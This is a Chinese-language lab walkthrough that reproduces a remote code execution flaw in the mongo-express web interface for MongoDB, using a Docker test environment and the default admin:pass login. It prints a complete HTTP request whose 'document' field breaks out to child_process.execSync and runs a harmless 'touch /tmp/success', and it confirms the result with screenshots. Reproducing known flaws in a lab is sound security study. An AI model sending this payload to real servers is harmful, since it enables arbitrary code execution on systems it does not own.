# 漏洞描述

mongo-express是一款mongodb的第三方Web界面，使用node和express开发。如果攻击者可以成功登录，或者目标服务器没有修改默认的账号密码（admin:pass），则可以执行任意node.js代码。

# 漏洞环境

使用docker漏洞环境  
漏洞使用，必须root环境  
![图片.png](https://image.3001.net/images/20211025/1635128746_617615aa9d58066e241b7.png!small)  
环境启动后，访问http://your-ip:8081即可查看到Web页面。  
http://127.0.0.1:8081/  
![图片.png](https://image.3001.net/images/20211025/1635129005_617616ad450a267c298af.png!small)  
对首页进行抓包  
![图片.png](https://image.3001.net/images/20211025/1635129113_617617199cbbfd02351e7.png!small)  
发送到repeater

    
    
    POST /checkValid HTTP/1.1
    
    Host: 127.0.0.1:8081
    
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    
    Accept: */*
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Connection: close
    
    Referer: http://127.0.0.1:8081/
    
    Cookie: hblid=OCkAkPEOWHj8QX5o3m39N0H02BOA0I12; olfsk=olfsk8528760320823083; mongo-express=s%3A-5O4JpzDs7hWHqdrWAHsoAtoP0cyKhbz.3u07nnkJ%2FSmEp21K77ALoB7nB3WhJMe%2FE2qD%2B8fjVWI
    
    If-Modified-Since: Sat, 26 Oct 1985 08:15:00 GMT
    
    If-None-Match: W/"409-7438674ba0"
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 126
    
    
    
    document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/success")
    

![图片.png](https://image.3001.net/images/20211025/1635129316_617617e423ca439912a59.png!small)

docker ps -a

![图片.png](https://image.3001.net/images/20211025/1635129587_617618f3e624bdad94880.png!small)

可以看到成功

![图片.png](https://image.3001.net/images/20211025/1635129643_6176192b5e01d28fa4493.png!small)

